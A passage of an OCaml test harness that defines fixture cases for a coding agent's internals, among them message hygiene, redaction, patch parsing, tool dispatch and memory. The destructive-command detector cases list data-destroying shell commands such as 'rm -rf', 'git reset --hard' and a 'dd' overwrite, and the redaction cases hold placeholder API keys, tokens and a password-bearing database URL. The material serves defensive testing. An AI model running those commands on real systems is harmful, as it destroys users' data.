              [ seq ~label:"unsorted_keys"
                  [ assistant (`List [ tc "{\"b\":1,\"a\":{\"z\":true,\"y\":null}}" ]) ];
                seq ~label:"whitespace_collapsed"
                  [ assistant (`List [ tc "{ \"k\" : \"v\" }" ]) ];
                seq ~label:"non_dict_entry_kept"
                  [ assistant (`List [ `String "weird"; tc "{\"a\":1}" ]) ];
                seq ~label:"no_function_key_kept"
                  [ assistant (`List [ `Assoc [ ("id", `String "bare") ] ]) ];
                seq ~label:"empty_tool_calls_kept"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `String "ok");
                        ("tool_calls", `List []) ] ];
                seq ~label:"no_tool_calls_untouched"
                  [ msg [ ("role", `String "user"); ("content", `String "hi") ] ];
                seq ~label:"unicode_escaped" [ assistant (`List [ tc "{\"t\":\"\xC3\xA9\"}" ]) ];
                seq ~label:"nested_arrays_order_kept"
                  [ assistant (`List [ tc "{\"l\":[3,2,{\"b\":0,\"a\":1}]}" ]) ] ] );
          ("unit", `String "canonical_args") ] );
    ( "loop.continuation_prompt",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc
                  [ ("label", `String "partial_with_tools");
                    ("is_partial_stub", `Bool true);
                    ("dropped_tools",
                     `List
                       [ `String "write_file"; `String "patch"; `String "search";
                         `String "extra_beyond_three" ]) ];
                `Assoc
                  [ ("label", `String "partial_stub");
                    ("is_partial_stub", `Bool true); ("dropped_tools", `List []) ];
                `Assoc
                  [ ("label", `String "length_truncated");
                    ("is_partial_stub", `Bool false); ("dropped_tools", `List []) ] ] );
          ("unit", `String "continuation_prompt") ] ) ]

(* The four remaining agent_loop slices, one prefix each, same machinery.
   Every scenario names its frozen unit; exclusions are stated beside the
   cases they scope. *)

let case_str ~label pairs =
  `Assoc (("label", `String label) :: List.map (fun (k, v) -> (k, `String v)) pairs)

(* prompt_assembly (agent/prompt_builder.py). Excluded: the config-reading
   resolution layer over the dynamic budget, and the live system-prompt build
   (filesystem + agent object). *)
let prompt_scenarios : (string * Yojson.Safe.t) list =
  [ ( "prompt.frontmatter_strip",
      `Assoc
        [ ( "cases",
            `List
              [ case_str ~label:"plain_passthrough" [ ("content", "hello\nworld") ];
                case_str ~label:"normal_frontmatter"
                  [ ("content", "---\nmodel: x\n---\nbody text") ];
                case_str ~label:"bom_tolerated"
                  [ ("content", "\xEF\xBB\xBF---\nk: v\n---\nafter bom") ];
                case_str ~label:"no_closing_fence_kept"
                  [ ("content", "---\nk: v\nno close") ];
                case_str ~label:"empty_body_returns_original"
                  [ ("content", "---\nk: v\n---\n") ];
                case_str ~label:"extra_newlines_stripped"
                  [ ("content", "---\nk: v\n---\n\n\nbody") ] ] );
          ("unit", `String "frontmatter_strip") ] );
    ( "prompt.steer_marker",
      `Assoc
        [ ( "cases",
            `List
              [ case_str ~label:"single_line" [ ("text", "adjust course") ];
                case_str ~label:"multi_line" [ ("text", "first\nsecond") ] ] );
          ("unit", `String "steer_marker") ] );
    ( "prompt.context_file_budget",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc [ ("label", `String "unknown_window"); ("context_length", `Null) ];
                `Assoc [ ("label", `String "zero_window"); ("context_length", `Int 0) ];
                `Assoc [ ("label", `String "small_window_floors"); ("context_length", `Int 1000) ];
                `Assoc
                  [ ("label", `String "mid_window_scales"); ("context_length", `Int 100000) ];
                `Assoc
                  [ ("label", `String "huge_window_ceilinged");
                    ("context_length", `Int 10000000) ] ] );
          ("unit", `String "context_file_budget") ] ) ]

(* context_engine (agent/context_references.py). The parser and the quoting
   rule; expansion/injection needs the filesystem and is out of scope. *)
let context_scenarios : (string * Yojson.Safe.t) list =
  [ ( "context.reference_parse",
      `Assoc
        [ ( "cases",
            `List
              [ case_str ~label:"file_plain" [ ("message", "look at @file:src/main.ml please") ];
                case_str ~label:"file_quoted_range"
                  [ ("message", "@file:'a b.txt':10-20 rest") ];
                case_str ~label:"file_single_line" [ ("message", "@file:src/x.ml:15") ];
                case_str ~label:"simple_refs" [ ("message", "@diff and @staged.") ];
                case_str ~label:"lookbehind_word" [ ("message", "email me@file:nope") ];
                case_str ~label:"lookbehind_slash" [ ("message", "path/@file:x") ];
                case_str ~label:"trailing_punct" [ ("message", "@folder:docs/, then") ];
                case_str ~label:"git_bang" [ ("message", "@git:HEAD~3!") ];
                case_str ~label:"balanced_parens_kept"
                  [ ("message", "@url:https://x.io/a(b)") ];
                case_str ~label:"unbalanced_paren_stripped"
                  [ ("message", "@url:https://x.io/a)") ];
                case_str ~label:"no_boundary" [ ("message", "@diffx is not a ref") ];
                case_str ~label:"quoted_backtick_range"
                  [ ("message", "@file:`quoted path`:3-4") ];
                case_str ~label:"simple_at_end" [ ("message", "see @staged") ] ] );
          ("unit", `String "reference_parse") ] );
    ( "context.reference_quote",
      `Assoc
        [ ( "cases",
            `List
              [ case_str ~label:"clean_unquoted" [ ("value", "src/main.ml") ];
                case_str ~label:"space_backticked" [ ("value", "a b.txt") ];
                case_str ~label:"backtick_inside_doublequoted" [ ("value", "a `b` c") ];
                case_str ~label:"both_quotes_single" [ ("value", "a `x` \"y\" z") ];
                case_str ~label:"all_quotes_unquotable" [ ("value", "`a` \"b\" 'c' d") ] ] );
          ("unit", `String "reference_quote") ] ) ]

(* context_compression (agent/context_compressor.py). The marker round-trip;
   the frozen reinjection redacts its appended block, identity on the clean
   text this domain carries -- the redactor is a separate unmeasured unit. *)
let compress_scenarios : (string * Yojson.Safe.t) list =
  [ ( "compress.skill_markers",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc [ ("label", `String "marker_shape"); ("op", `String "marker");
                         ("name", `String "pdf-tools") ];
                `Assoc
                  [ ("label", `String "extract_two_dedup"); ("op", `String "extract");
                    ("text",
                     `String
                       ("before [SKILL_PRUNED: content lost in compression; reload with \
                         skill_view(name='alpha')] mid [SKILL_PRUNED: content lost in \
                         compression; reload with skill_view(name='beta')] and again \
                         [SKILL_PRUNED: content lost in compression; reload with \
                         skill_view(name='alpha')] end")) ];
                `Assoc
                  [ ("label", `String "extract_ignores_broken"); ("op", `String "extract");
                    ("text",
                     `String
                       "[SKILL_PRUNED: damaged ] reload with skill_view(name='ghost')") ];
                `Assoc
                  [ ("label", `String "reinject_missing"); ("op", `String "reinject");
                    ("summary", `String "The work continued.");
                    ("names", `List [ `String "alpha"; `String "beta" ]) ];
                `Assoc
                  [ ("label", `String "reinject_survivor_untouched"); ("op", `String "reinject");
                    ("summary",
                     `String
                       ("kept: [SKILL_PRUNED: content lost in compression; reload with \
                         skill_view(name='alpha')]"));
                    ("names", `List [ `String "alpha" ]) ];
                `Assoc
                  [ ("label", `String "reinject_no_names"); ("op", `String "reinject");
                    ("summary", `String "untouched"); ("names", `List []) ] ] );
          ("unit", `String "skill_markers") ] ) ]

(* turn_finalization (agent/turn_finalizer.py + agent/turn_summary.py). *)
let finalize_scenarios : (string * Yojson.Safe.t) list =
  let msg fields = `Assoc fields in
  let call = `Assoc [ ("id", `String "t"); ("function", `Assoc [ ("name", `String "f") ]) ] in
  [ ( "finalize.pure_tail",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc
                  [ ("label", `String "calls_no_content");
                    ("message",
                     msg [ ("role", `String "assistant"); ("content", `Null);
                           ("tool_calls", `List [ call ]) ]) ];
                `Assoc
                  [ ("label", `String "calls_with_text");
                    ("message",
                     msg [ ("role", `String "assistant"); ("content", `String "hi");
                           ("tool_calls", `List [ call ]) ]) ];
                `Assoc
                  [ ("label", `String "empty_calls_not_tail");
                    ("message",
                     msg [ ("role", `String "assistant"); ("content", `Null);
                           ("tool_calls", `List []) ]) ];
                `Assoc
                  [ ("label", `String "blank_multimodal_is_tail");
                    ("message",
                     msg
                       [ ("role", `String "assistant");
                         ("content",
                          `List
                            [ `Assoc [ ("type", `String "text"); ("text", `String "  ") ] ]);
                         ("tool_calls", `List [ call ]) ]) ];
                `Assoc
                  [ ("label", `String "image_only_is_tail");
                    ("message",
                     msg
                       [ ("role", `String "assistant");
                         ("content",
                          `List
                            [ `Assoc
                                [ ("type", `String "image_url");
                                  ("image_url", `Assoc [ ("url", `String "u") ]) ] ]);
                         ("tool_calls", `List [ call ]) ]) ] ] );
          ("unit", `String "pure_tail") ] );
    ( "finalize.scaffolding",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc
                  [ ("label", `String "nudges_dropped_real_kept");
                    ("messages",
                     `List
                       [ msg [ ("role", `String "user"); ("content", `String "real") ];
                         msg
                           [ ("role", `String "user"); ("content", `String "nudge");
                             ("_verification_stop_synthetic", `Bool true) ];
                         msg [ ("role", `String "assistant"); ("content", `String "answer") ];
                         msg
                           [ ("role", `String "user"); ("content", `String "nudge2");
                             ("_pre_verify_synthetic", `Bool true) ];
                         msg
                           [ ("role", `String "user"); ("content", `String "flag false");
                             ("_pre_verify_synthetic", `Bool false) ] ]) ] ] );
          ("unit", `String "scaffolding") ] );
    ( "finalize.summary_format",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc [ ("label", `String "elapsed_subminute"); ("op", `String "elapsed");
                         ("seconds", `Float 12.44) ];
                `Assoc [ ("label", `String "elapsed_zero"); ("op", `String "elapsed");
                         ("seconds", `Float 0.0) ];
                `Assoc [ ("label", `String "elapsed_negative"); ("op", `String "elapsed");
                         ("seconds", `Float (-5.0)) ];
                `Assoc [ ("label", `String "elapsed_minutes"); ("op", `String "elapsed");
                         ("seconds", `Float 65.0) ];
                `Assoc [ ("label", `String "elapsed_long"); ("op", `String "elapsed");
                         ("seconds", `Float 3661.0) ];
                `Assoc
                  [ ("label", `String "diff_counts"); ("op", `String "diff");
                    ("text",
                     `String "--- a/f\n+++ b/f\n+one\n+two\n-gone\n context\n+three") ];
                `Assoc [ ("label", `String "plural_one"); ("op", `String "plural");
                         ("count", `Int 1); ("noun", `String "files") ];
                `Assoc [ ("label", `String "plural_many"); ("op", `String "plural");
                         ("count", `Int 3); ("noun", `String "files") ];
                `Assoc [ ("label", `String "plural_ies"); ("op", `String "plural");
                         ("count", `Int 1); ("noun", `String "entries") ];
                `Assoc [ ("label", `String "plural_ses"); ("op", `String "plural");
                         ("count", `Int 1); ("noun", `String "processes") ] ] );
          ("unit", `String "summary_format") ] ) ]

let candidate_hygiene params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  let unit_id =
    match field "unit" with Some (`String unit_id) -> unit_id | _ -> "strict_strip"
  in
  match field "cases" with
  | Some (`List cases) ->
      let one = function
        | `Assoc fields -> (
            match (unit_id, List.assoc_opt "label" fields, List.assoc_opt "messages" fields) with
            | "strict_strip", Some (`String label), Some (`List messages) -> (
                match List.assoc_opt "model" fields with
                | Some (`String model_id) ->
                    Some (label, `List (Message_hygiene.sanitize_messages ~model_id messages))
                | _ -> None)
            | "list_repairs", Some (`String label), Some (`List messages) ->
                Some (label, `List (Message_repairs.sanitize_api_messages messages))
            | "surrogates", Some (`String label), _ -> (
                match List.assoc_opt "parts" fields with
                | Some (`List parts) ->
                    Some
                      ( label,
                        `String (Message_hygiene.replace_surrogate_utf8 (text_of_parts parts))
                      )
                | _ -> None)
            | _ -> None)
        | _ -> None
      in
      let results = List.filter_map one cases in
      (* A malformed case must fail the whole scenario, not silently shrink the
         comparison population. *)
      if List.length results <> List.length cases then None
      else Some (`Assoc [ ("results", `Assoc results) ])
  | _ -> None

let compare_hygiene_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id hygiene_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no hygiene cases defined for " ^ scenario_id)
           ~cause:"the harness has no hygiene scenario for this id"
           ~fix:"add a hygiene_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_hygiene params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the hygiene scenario is malformed"
               ~cause:"candidate_hygiene could not read the cases list"
               ~fix:"fix the hygiene_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

let candidate_loop params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  let unit_id = match field "unit" with Some (`String unit_id) -> unit_id | _ -> "" in
  match field "cases" with
  | Some (`List cases) ->
      let one = function
        | `Assoc fields -> (
            match (unit_id, List.assoc_opt "label" fields) with
            | "canonical_args", Some (`String label) -> (
                match List.assoc_opt "messages" fields with
                | Some (`List messages) -> (
                    match Loop_send_path.canonicalize_api_tool_calls messages with
                    | canonical -> Some (label, `List canonical)
                    | exception _ -> None)
                | _ -> None)
            | "continuation_prompt", Some (`String label) -> (
                match
                  (List.assoc_opt "is_partial_stub" fields, List.assoc_opt "dropped_tools" fields)
                with
                | Some (`Bool is_partial_stub), Some (`List dropped) ->
                    let dropped_tools =
                      List.filter_map
                        (function `String tool -> Some tool | _ -> None)
                        dropped
                    in
                    Some
                      ( label,
                        `String
                          (Loop_send_path.continuation_prompt ~is_partial_stub ~dropped_tools)
                      )
                | _ -> None)
            | _ -> None)
        | _ -> None
      in
      let results = List.filter_map one cases in
      if List.length results <> List.length cases then None
      else Some (`Assoc [ ("results", `Assoc results) ])
  | _ -> None

let compare_loop_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id loop_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no loop cases defined for " ^ scenario_id)
           ~cause:"the harness has no loop scenario for this id"
           ~fix:"add a loop_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_loop params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the loop scenario is malformed"
               ~cause:"candidate_loop could not read the cases list"
               ~fix:"fix the loop_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Redaction (agent/redact.py), measured on the exact profile the two
   already-verified callers pass: force=true, redact_url_credentials as
   declared per case. Seven pattern classes are implemented
   (vendor prefixes, auth headers, secret headers, DB connection strings,
   bare-token userinfo, JWTs, the strict URL-credential pass); the
   ENV/config/YAML/JSON assignment battery, telegram tokens, private-key
   blocks, form bodies, E.164 phones and the control-split pre-pass are
   separate frozen sub-units, and every case below is CONSTRUCTED to keep
   them gated off (bare header-shaped cases carry :// so the YAML pass's
   own URL gate excludes them; no assignment shapes outside URLs; no plus
   signs; no clean form bodies). Credited to message_hygiene, whose catalog
   anchors include redact.py. *)
let redact_scenarios : (string * Yojson.Safe.t) list =
  let case ~label ?(url_creds = true) text =
    `Assoc
      [ ("label", `String label); ("text", `String text);
        ("redact_url_credentials", `Bool url_creds) ]
  in
  [ ( "redact.sensitive_text",
      `Assoc
        [ ( "cases",
            `List
              [ case ~label:"clean_prose" "no secrets in this line";
                case ~label:"openai_key" "key sk-proj-A1b2C3d4E5f6G7h8 used";
                case ~label:"short_key_floor" "sk-abcdefghij";
                case ~label:"github_pat" "ghp_ABCDEFGHIJKLMNOP1234";
                case ~label:"aws_exact_sixteen" "aws AKIAIOSFODNN7EXAMPLE here";
                case ~label:"gitlab_pat" "glpat-XyZ_123-abcDEF";
                case ~label:"bearer_jwt_header"
                  "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln \
                   via https://api.host";
                case ~label:"raw_authorization"
                  "Authorization: some-opaque-token-value-123456 for https://api.host";
                case ~label:"x_api_key_header"
                  "GET https://api.local x-api-key: 1234567890abcdefghij";
                case ~label:"jwt_bare"
                  "token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjB9.c2lnbmF0dXJl end";
                case ~label:"db_connstring"
                  "postgresql://svc:hunter2pass@db.internal:5432/app";
                case ~label:"bare_userinfo_masked_then_starred"
                  "https://ghtokenvalue123@github.com/org/repo.git";
                case ~label:"sensitive_params"
                  "https://api.example.com/cb?code=abc123&state=xyz&api-key=zzz#frag";
                case ~label:"userinfo_user_pass" "https://alice:s3cret@example.com/x";
                case ~label:"percent_decoded_param" "https://x.io/cb?a%70i_key=v";
                case ~label:"params_pass_through_when_off" ~url_creds:false
                  "https://api.example.com/cb?code=abc123&state=xyz" ] );
          ("unit", `String "sensitive_text") ] ) ]

(* The tool_execution family, one prefix per slice, each measuring a pure
   frozen unit. Excluded (disclosed beside each): every registry/approval/
   dispatch path that touches the tool registry, filesystem, contextvars or
   config.yaml -- impure resolution layers over the pure cores below. *)

let tool_scenarios : (string * Yojson.Safe.t) list =
  let td name description =
    (* a minimal tool-def, clean ASCII so json length is unambiguous *)
    `Assoc
      [ ("type", `String "function");
        ("function",
         `Assoc [ ("name", `String name); ("description", `String description) ]) ]
  in
  [ (* tool_registry: estimate_tokens / should_activate / listing_budget *)
    ( "tool.registry",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc
                  [ ("label", `String "estimate_empty"); ("op", `String "estimate");
                    ("tool_defs", `List []) ];
                `Assoc
                  [ ("label", `String "estimate_two"); ("op", `String "estimate");
                    ("tool_defs", `List [ td "lookup" "look up a thing"; td "write" "write a file" ]) ];
                `Assoc
                  [ ("label", `String "activate_off"); ("op", `String "activate");
                    ("enabled", `String "off"); ("deferrable_tokens", `Int 500) ];
                `Assoc
                  [ ("label", `String "activate_none"); ("op", `String "activate");
                    ("enabled", `String "auto"); ("deferrable_tokens", `Int 0) ];
                `Assoc
                  [ ("label", `String "activate_yes"); ("op", `String "activate");
                    ("enabled", `String "auto"); ("deferrable_tokens", `Int 12) ];
                `Assoc
                  [ ("label", `String "budget_unknown_window"); ("op", `String "budget");
                    ("threshold_pct", `Float 5.0); ("listing_max_tokens", `Int 8000);
                    ("context_length", `Null) ];
                `Assoc
                  [ ("label", `String "budget_pct_leg"); ("op", `String "budget");
                    ("threshold_pct", `Float 5.0); ("listing_max_tokens", `Int 8000);
                    ("context_length", `Int 200000) ];
                `Assoc
                  [ ("label", `String "budget_capped"); ("op", `String "budget");
                    ("threshold_pct", `Float 50.0); ("listing_max_tokens", `Int 8000);
                    ("context_length", `Int 200000) ] ] );
          ("unit", `String "registry") ] );
    (* tool_dispatch: _is_destructive_command *)
    ( "tool.destructive",
      `Assoc
        [ ( "cases",
            `List
              (List.map
                 (fun (label, cmd) ->
                   `Assoc [ ("label", `String label); ("cmd", `String cmd) ])
                 [ ("empty", ""); ("plain_echo", "echo hello");
                   ("rm_at_start", "rm -rf build"); ("rm_after_and", "make && rm -rf out");
                   ("rm_after_semi", "cd x; rm file"); ("mv_piped", "ls || mv a b");
                   ("sed_inplace", "sed -i s/a/b/ file"); ("git_reset", "git reset --hard");
                   ("git_status_safe", "git status"); ("rmdir_word_only", "confirm-rm now");
                   ("redirect_overwrite", "echo x > out.txt");
                   ("redirect_append_safe", "echo x >> out.txt");
                   ("dd_cmd", "dd if=/dev/zero of=f"); ("cp_backtick", "echo `cp a b`") ]) );
          ("unit", `String "destructive") ] );
    (* approval_policy: _normalize_enabled *)
    ( "tool.approval_normalize",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc [ ("label", `String "bool_true"); ("value", `Bool true) ];
                `Assoc [ ("label", `String "bool_false"); ("value", `Bool false) ];
                `Assoc [ ("label", `String "str_on"); ("value", `String "on") ];
                `Assoc [ ("label", `String "str_approve_upper"); ("value", `String " APPROVE ") ];
                `Assoc [ ("label", `String "str_no"); ("value", `String "no") ];
                `Assoc [ ("label", `String "str_garbage"); ("value", `String "maybe") ];
                `Assoc [ ("label", `String "int_value"); ("value", `Int 1) ];
                `Assoc [ ("label", `String "null_value"); ("value", `Null) ] ] );
          ("unit", `String "approval_normalize") ] );
    (* file_operations: parse_v4a_patch -- the anchor *)
    ( "tool.patch_parse",
      `Assoc
        [ ( "cases",
            `List
              (List.map
                 (fun (label, patch) ->
                   `Assoc [ ("label", `String label); ("patch", `String patch) ])
                 [ ("empty", "");
                   ("update_one_hunk",
                    "*** Begin Patch\n*** Update File: a.ml\n@@ ctx @@\n old\n-gone\n+added\n*** End Patch");
                   ("add_file",
                    "*** Begin Patch\n*** Add File: new.txt\n+line one\n+line two\n*** End Patch");
                   ("delete_file", "*** Begin Patch\n*** Delete File: dead.ml\n*** End Patch");
                   ("move_file", "*** Begin Patch\n*** Move File: old.ml -> new.ml\n*** End Patch");
                   ("no_markers", "just some text\nwith no patch");
                   ("update_no_hunks_errors",
                    "*** Begin Patch\n*** Update File: b.ml\n*** End Patch");
                   ("crlf_body",
                    "*** Begin Patch\r\n*** Update File: c.ml\r\n@@ h @@\r\n ctx\r\n+new\r\n*** End Patch");
                   ("multi_op",
                    "*** Begin Patch\n*** Update File: x\n@@ @@\n a\n+b\n*** Delete File: y\n*** End Patch");
                   ("implicit_context_line",
                    "*** Begin Patch\n*** Update File: d.ml\n@@ @@\nbare context\n+new\n*** End Patch") ]) );
          ("unit", `String "patch_parse") ] );
    (* result_normalization: canonical_tool_args / classify_tool_failure /
       file_mutation_result_landed *)
    ( "tool.result",
      `Assoc
        [ ( "cases",
            `List
              [ `Assoc
                  [ ("label", `String "canonical_sorts"); ("op", `String "canonical");
                    ("args", `Assoc [ ("b", `Int 1); ("a", `Assoc [ ("z", `Bool true) ]) ]) ];
                `Assoc
                  [ ("label", `String "canonical_unicode"); ("op", `String "canonical");
                    ("args", `Assoc [ ("t", `String "caf\xC3\xA9") ]) ];
                `Assoc
                  [ ("label", `String "classify_terminal_fail"); ("op", `String "classify");
                    ("tool_name", `String "terminal");
                    ("result", `String "{\"exit_code\": 2}") ];
                `Assoc
                  [ ("label", `String "classify_terminal_ok"); ("op", `String "classify");
                    ("tool_name", `String "terminal");
                    ("result", `String "{\"exit_code\": 0}") ];
                `Assoc
                  [ ("label", `String "classify_error_json"); ("op", `String "classify");
                    ("tool_name", `String "web_search");
                    ("result", `String "{\"error\": \"boom\"}") ];
                `Assoc
                  [ ("label", `String "classify_error_prefix"); ("op", `String "classify");
                    ("tool_name", `String "web_search"); ("result", `String "Error: nope") ];
                `Assoc
                  [ ("label", `String "classify_none"); ("op", `String "classify");
                    ("tool_name", `String "web_search"); ("result", `Null) ];
                `Assoc
                  [ ("label", `String "classify_write_landed"); ("op", `String "classify");
                    ("tool_name", `String "write_file");
                    ("result", `String "{\"bytes_written\": 42}") ];
                `Assoc
                  [ ("label", `String "landed_write_true"); ("op", `String "landed");
                    ("tool_name", `String "write_file");
                    ("result", `String "{\"bytes_written\": 10}") ];
                `Assoc
                  [ ("label", `String "landed_patch_success"); ("op", `String "landed");
                    ("tool_name", `String "patch"); ("result", `String "{\"success\": true}") ];
                `Assoc
                  [ ("label", `String "landed_error_false"); ("op", `String "landed");
                    ("tool_name", `String "write_file");
                    ("result", `String "{\"bytes_written\": 1, \"error\": \"x\"}") ];
                `Assoc
                  [ ("label", `String "landed_nonmutating"); ("op", `String "landed");
                    ("tool_name", `String "read_file"); ("result", `String "{\"success\": true}") ] ] );
          ("unit", `String "result") ] ) ]

(* The context_files family (agent/coding_context.py, subdirectory_hints.py,
   context_breakdown.py, gateway/cwd_placeholder.py). Excluded, disclosed: the
   workspace-detection stat branch of _detect_profile_name and runtime_cwd's
   contextvars/filesystem paths. *)
let context_file_scenarios : (string * Yojson.Safe.t) list =
  let c fields = `Assoc fields in
  [ ( "cfile.coding_context",
      c [ ("cases",
           `List
             [ c [ ("label", `String "family_gpt"); ("op", `String "family");
                   ("model", `String "openai/gpt-5.4") ];
               c [ ("label", `String "family_claude"); ("op", `String "family");
                   ("model", `String "anthropic/claude-sonnet-4.5") ];
               c [ ("label", `String "family_none"); ("op", `String "family");
                   ("model", `String "some/unknown-model") ];
               c [ ("label", `String "family_empty"); ("op", `String "family");
                   ("model", `String "") ];
               c [ ("label", `String "line_replace"); ("op", `String "line");
                   ("model", `String "google/gemini-3-pro") ];
               c [ ("label", `String "line_none"); ("op", `String "line");
                   ("model", `String "unknown") ];
               c [ ("label", `String "profile_off"); ("op", `String "profile");
                   ("mode", `String "off"); ("platform", `String "cli") ];
               c [ ("label", `String "profile_on"); ("op", `String "profile");
                   ("mode", `String "on"); ("platform", `String "cli") ];
               c [ ("label", `String "profile_noninteractive"); ("op", `String "profile");
                   ("mode", `String "auto"); ("platform", `String "webhook") ] ]);
          ("unit", `String "coding_context") ] );
    ( "cfile.ancestor",
      c [ ("cases",
           `List
             [ c [ ("label", `String "same"); ("a", `String "/x/y"); ("b", `String "/x/y") ];
               c [ ("label", `String "ancestor"); ("a", `String "/x"); ("b", `String "/x/y/z") ];
               c [ ("label", `String "not_ancestor"); ("a", `String "/x/y"); ("b", `String "/x") ];
               c [ ("label", `String "sibling"); ("a", `String "/x/y"); ("b", `String "/x/z") ];
               c [ ("label", `String "prefix_not_component");
                   ("a", `String "/foo"); ("b", `String "/foobar") ] ]);
          ("unit", `String "ancestor") ] );
    ( "cfile.breakdown",
      c [ ("cases",
           `List
             [ c [ ("label", `String "chars_empty"); ("op", `String "chars"); ("text", `String "") ];
               c [ ("label", `String "chars_five"); ("op", `String "chars"); ("text", `String "hello") ];
               c [ ("label", `String "bytes_none"); ("op", `String "bytes"); ("size", `Null) ];
               c [ ("label", `String "bytes_ten"); ("op", `String "bytes"); ("size", `Int 10) ];
               c [ ("label", `String "json_empty"); ("op", `String "json"); ("value", `Assoc []) ];
               c [ ("label", `String "json_obj"); ("op", `String "json");
                   ("value", `Assoc [ ("a", `Int 1); ("b", `String "x") ]) ];
               c [ ("label", `String "split_tools"); ("op", `String "split");
                   ("tools",
                    `List
                      [ `Assoc [ ("function", `Assoc [ ("name", `String "read_file") ]) ];
                        `Assoc [ ("function", `Assoc [ ("name", `String "mcp_github_pr") ]) ];
                        `Assoc [ ("name", `String "delegate_task") ];
                        `Assoc [ ("function", `Assoc [ ("name", `String "patch") ]) ] ]) ] ]);
          ("unit", `String "breakdown") ] );
    ( "cfile.cwd_placeholder",
      c [ ("cases",
           `List
             [ c [ ("label", `String "configured_real"); ("configured_cwd", `String "/work/proj");
                   ("terminal_backend", `String "local"); ("messaging_cwd", `Null);
                   ("docker_mount_cwd_to_workspace", `Bool false); ("home_fallback", `String "/home/u") ];
               c [ ("label", `String "local_messaging"); ("configured_cwd", `String ".");
                   ("terminal_backend", `String "local"); ("messaging_cwd", `String "/msg/dir");
                   ("docker_mount_cwd_to_workspace", `Bool false); ("home_fallback", `String "/home/u") ];
               c [ ("label", `String "local_home_fallback"); ("configured_cwd", `String "auto");
                   ("terminal_backend", `String "local"); ("messaging_cwd", `Null);
                   ("docker_mount_cwd_to_workspace", `Bool false); ("home_fallback", `String "/home/u") ];
               c [ ("label", `String "docker_mount_host"); ("configured_cwd", `String "cwd");
                   ("terminal_backend", `String "docker"); ("messaging_cwd", `String "/host/w");
                   ("docker_mount_cwd_to_workspace", `Bool true); ("home_fallback", `String "/home/u") ];
               c [ ("label", `String "docker_no_mount"); ("configured_cwd", `String ".");
                   ("terminal_backend", `String "docker"); ("messaging_cwd", `String "/host/w");
                   ("docker_mount_cwd_to_workspace", `Bool false); ("home_fallback", `String "/home/u") ] ]);
          ("unit", `String "cwd_placeholder") ] ) ]

(* The memory family (agent/memory_manager.py, agent/memory_provider.py).
   Excluded, disclosed: session_state/session_search (SQLite/FTS5),
   state_portability, and the toolset-resolution import branch of
   memory_provider_tools_enabled. *)
let memory_scenarios : (string * Yojson.Safe.t) list =
  let c fields = `Assoc fields in
  [ ( "mem.manager",
      c [ ("cases",
           `List
             [ c [ ("label", `String "normalize_bare"); ("op", `String "normalize");
                   ("schema", `Assoc [ ("name", `String "recall"); ("description", `String "d") ]) ];
               c [ ("label", `String "normalize_wrapped"); ("op", `String "normalize");
                   ("schema",
                    `Assoc [ ("type", `String "function");
                             ("function", `Assoc [ ("name", `String "recall") ]) ]) ];
               c [ ("label", `String "normalize_nameless"); ("op", `String "normalize");
                   ("schema", `Assoc [ ("description", `String "no name") ]) ];
               c [ ("label", `String "enabled_disabled"); ("op", `String "enabled");
                   ("enabled_toolsets", `Null); ("disabled_toolsets", `List [ `String "memory" ]);
                   ("memory_tool_present", `Bool false) ];
               c [ ("label", `String "enabled_present"); ("op", `String "enabled");
                   ("enabled_toolsets", `List [ `String "coding" ]); ("disabled_toolsets", `Null);
                   ("memory_tool_present", `Bool true) ];
               c [ ("label", `String "enabled_none"); ("op", `String "enabled");
                   ("enabled_toolsets", `Null); ("disabled_toolsets", `Null);
                   ("memory_tool_present", `Bool false) ];
               c [ ("label", `String "enabled_empty"); ("op", `String "enabled");
                   ("enabled_toolsets", `List []); ("disabled_toolsets", `Null);
